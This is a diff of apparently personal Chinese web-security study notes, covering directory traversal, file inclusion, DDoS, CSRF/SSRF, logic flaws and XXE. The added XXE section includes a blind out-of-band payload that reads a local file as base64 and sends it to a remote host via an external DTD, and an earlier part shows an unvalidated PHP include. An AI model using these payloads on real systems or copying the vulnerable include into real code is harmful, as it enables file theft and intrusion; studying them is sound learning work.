@@ -475,6 +475,7 @@
 <p>防御：敏感函数禁用，变量固定，waf</p>
 <p>poc验证漏洞是否存在  exp是漏洞利用代码<br>一句话菜刀原理：远程命令执行相似 把函数功能嵌套到程序里面。</p>
 <h1 id="FIVE-目录遍历"><a href="#FIVE-目录遍历" class="headerlink" title="FIVE:目录遍历"></a>FIVE:目录遍历</h1><p>目录遍历漏洞原理比较简单，就是程序在实现上没有充分过滤用户输入的…&#x2F;之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。这里的目录跳转符可以是…&#x2F;，也可是…&#x2F;的ASCII编码或者是unicode编码等。</p>
+<p>你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，<u>都是在功能设计中将要操作的文件使用变量的 方式传递给了后台</u><br>如果你通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为</a><u>敏感信息泄露。</u></p>
 <h1 id="SIX-文件包含"><a href="#SIX-文件包含" class="headerlink" title="SIX:文件包含"></a>SIX:文件包含</h1><p>通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。<br>本地文件包含：绕过：.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;    …………………………………………………..         windows 大于256<br>远程文件包含：绕过：?   %20    %23<br>无限制的文件包含漏洞：<br>root@f3d91c74e2ee:&#x2F;var&#x2F;www&#x2F;html# cat include.php<br>&lt;?php</p>
 <p>$filename&#x3D;$_GET[‘filename’];<br>include ( $filename);</p>
 <p>&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/include.php?filename=index.txt">http://127.0.0.1:8080/include.php?filename=index.txt</a><br>&#x2F;*<br>$filename&#x3D;$_GET[‘filename’];<br>include ( $filename .” .html” );<br>*&#x2F;</p>
@@ -484,8 +485,8 @@
 ?><br>访问ip&#x2F;include.php?filename&#x3D;index.txt</p>
 <h1 id="SEVEN-文件下载"><a href="#SEVEN-文件下载" class="headerlink" title="SEVEN:文件下载"></a>SEVEN:文件下载</h1><p>read.xxx?filename&#x3D;<br>down.xxx?filename&#x3D;<br>readfile.xxx?file&#x3D;<br>downfile.xxx?file&#x3D;<br>..&#x2F; ..\ .\ .&#x2F;等<br>&amp;readpath&#x3D;、&amp;filepath&#x3D;、&amp;path&#x3D;、&amp;inputfile&#x3D;、&amp;url&#x3D;、&amp;data&#x3D;、&amp;readfile&#x3D;、&amp;menu&#x3D;、META-INF&#x3D;<br>文件下载中..&#x2F;的使用</p>
 <h1 id="EIGHT-DDos"><a href="#EIGHT-DDos" class="headerlink" title="EIGHT:DDos"></a>EIGHT:DDos</h1><p>1.定义：分布式拒绝服务攻击(英文意思是Distributed Denial of Service，简称DDoS)是指处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击。由于攻击的发出点是分布在不同地方的，这类攻击称为分布式拒绝服务攻击。<br>2.它产生的原因就是大量的攻击者洪水般访问目标网站，从而使网站无法对用户服务进行响应。<br>3.产生条件：需要大量的肉鸡，也就是傀儡机。<br>4.DDoS攻击流程<br>1.信息搜集<br>被攻击目标主机数目、地址情况<br>目标主机的配置、性能<br>目标的带宽<br>2.占领傀儡机<br>黑客最感兴趣的是有下列情况的主机：<br>链路状态好的主机<br>性能好的主机<br>安全管理水平差的主机</p>
-<h1 id="NINE-csrf-ssrf"><a href="#NINE-csrf-ssrf" class="headerlink" title="NINE:csrf ssrf"></a>NINE:csrf ssrf</h1><p>1..CSRF（Cross-site request forgery），中文名称：跨站请求伪造<br>攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
-<p>2.SSRF(Server-Side Request Forgery:服务器端请求伪造):从其他服务器应用获取数据的功能,     利用有缺陷的web应用作为跳板攻击远程和内网的服务器。a可以访问b，b可以访问c，但是a不可以访问c.<br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<h1 id="NINE-csrf-ssrf"><a href="#NINE-csrf-ssrf" class="headerlink" title="NINE:csrf ssrf"></a>NINE:csrf ssrf</h1><p>1..CSRF（Cross-site request forgery），中文名称：跨站请求伪造<br>攻击者借用了你的身份，以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。<br>判断一个网站是否存在CSRF漏洞：就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>利用：1.需要被攻击这登录在网站上2.需要点击链接。<br>防御：–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。<br>和xss的区别，xss是获取用户cookie,用用户的身份实施破坏，<u>而csrf是借用用户的权限完成攻击</u>。<br>理论上讲，url跳转属于CSRF的一种，我们需要对传入的URL做有效性的认证，保证该URL来自于正确的地方</p>
+<p>2.SSRF(Server-Side Request Forgery:服务器端请求伪造):从其他服务器应用获取数据的功能, 利用有缺陷的web应用作为跳板攻击远程和内网的服务器。<u>a可以访问b，b可以访问c，但是a不可以访问c.</u><br>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
 <h1 id="TEN-逻辑漏洞："><a href="#TEN-逻辑漏洞：" class="headerlink" title="TEN:逻辑漏洞："></a>TEN:逻辑漏洞：</h1><p>1.登录点暴力破解<br>2.http和https 只有知道加密方式才可以进行爆破<br>3.  cookie脆弱<br>4.支付：数量负数，超过int值。更改订单编号，购买价格，修改商品信息：编号，名字、更改支付接口：微信，支付宝，自己的支付接口，支付状态，优惠券。<br>二.找回密码<br>找回密码：找回重置机制：客户端回显 resp状态码，验证码爆破，找回流程绕过。<br>接口调用乱用：短信轰炸，来电轰炸。<br>修改账号密码：到重置密码页面不提交，抓包修改手机号后进行重置密码操作。已达到登录别人账号的操作<br>客户端：在浏览器里可以看到验证码2.抓包里面显示<br>resp状态码：可以是1,0来判断正确错误  do 模块  前端验证而不是数据库验证<br>爆破验证码<br>接口安全：短信轰炸，来电轰炸。</p>
 <p>挖 功能点 参数<br>一.业务逻辑漏洞<br>支付：数量负数，超过int值。更改订单编号，购买价格，修改商品信息：编号，名字、更改支付接口：微信，支付宝，自己的支付接口，支付状态，优惠券。<br>二.用户身份：<br>暴力破解，密码找回:前端验证，短信轰炸，验证码爆破。cookie,session.<br>三验证码绕过：<br>验证码复用，后端没有对验证码进行销毁<br>前端，验证码一次正确，之后验证码不检测了。 发送60秒一次<br>token 替换爆破（需要一些设置） 前提：res包有token回显  密码和token值的爆破<br>四.接口<br>水平越权  wang uid&#x3D;10  设置为1-1000爆破<br>callback 跨站   spi爬虫 批量查询功能点如：id</p>
 <h1 id="ELEVEN-中间件"><a href="#ELEVEN-中间件" class="headerlink" title="ELEVEN:中间件"></a>ELEVEN:中间件</h1><p>常见中间件：iis,tomcat,apache,nginx,jboss,weblogic.</p>
@@ -496,6 +497,30 @@
 <p>web：一.网站源码：cms   二.搭建平台：中间件安全     三.数据库<br>asp+access     php+mysql    aspx+mssql    jsp+mssql,oracle    python+mongodb</p>
 <p>别人浏览你的asp页面是先发送请求到你的服务器 然后你的服务器就把通过IIS解析后的页面 返回给请求者<br>asp           iis+access<br>aspx          iis+mssql<br>Servlet（Server Applet）是Java Servlet的简称，称为小服务程序或服务连接器，用Java编写的服务器端程序，具有独立于平台和协议的特性，主要功能在于交互式地浏览和生成数据，生成动态Web内容。<br>tomcat      支持servlet,jsp</p>
 <p>Payload是黑客用来与被黑了的系统交互的简单脚本，指成功exploit之后，真正在目标系统执行的代码或指令。<br>exp:漏洞利用程序或代码。<br>poc:漏洞验证程序<br>为了开发一个动态网站出来，有3中选择<br>1、ASP.NET<br>ASP.NET 的开发框架是 Windows server +IIS+SQL Server+ASP的组合，主要开发语言有C#.NET和VB.NET。<br>2、J2EE开发平台<br>J2EE的开发架构是 UNIX&#x2F;windows+Tomcat+Orecle+JSP的组合，主要是用JAVA编写程序。比如Android平台级应用的网页后台用户管理端<br>3、LAMP开发平台<br>LAMP的开发架构是 Linux+Apache+MySQL+PHP，主要是用PHP来编写程序。比如Facebook</p>
+<h1 id="twelve-xxe"><a href="#twelve-xxe" class="headerlink" title="twelve:xxe"></a><strong>twelve:xxe</strong></h1><p>xml:是数据内容，传输和存储数据格式类型。<br>xxe:xml的漏洞注入全称，xml外部实体注入<br>xml :为传输和存储数据，焦点是数据内容  html:用来显示数据，焦点是数据的外观<br>利用：1..有回显得，文件读取2.内网探针或攻击内网应用。3.引入外部实体dtd<br>          2.无回显：读取文件，  增加代码复杂度，base64编码。 类似内网反弹效果，可以在日志文件看到攻击者操作。只需base64编码就可读取看到文件内容。</p>
+<p>检测：白盒<br>黑盒：人工，工具<br>人工 ：关键字：1.数据格式类型：<user>teset</user><pass>Mikasa</pass><br>2.content-Type值判断：text&#x2F;xml    application&#x2F;xml<br>3.更改content-Type值为上面类型，检测是否有xxe漏洞。</p>
+<p>无回显的代码，其中路径不用完整路径。所以无回显的利用较多。</p>
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<!DOCTYPE note [
+    <!ENTITY hack "hello world">
+<p>]&gt;<br><name>&amp;hack;</name></p>
+<p>无回显的代码，其中路径不用完整路径。所以无回显的利用较多。代码有增加其复杂度来达到绕过的那种意思。</p>
+<?xml version = "1.0"?>
+
+<!DOCTYPE test [
+        <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
+<pre><code>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.xx.xxx:80XX/test.dtd&quot;&gt;
+    %dtd;
+    %send;
+</code></pre>
+<p>]&gt;</p>
+<p>test.dtd:<br><!ENTITY % payload
+    "<!ENTITY &#x25; send SYSTEM
+'http://192.168.xx.xxx:80xx/?data=%file;'>“</p>
+<blockquote>
+<p>%payload;</p>
+</blockquote>
 
                 
             </div>
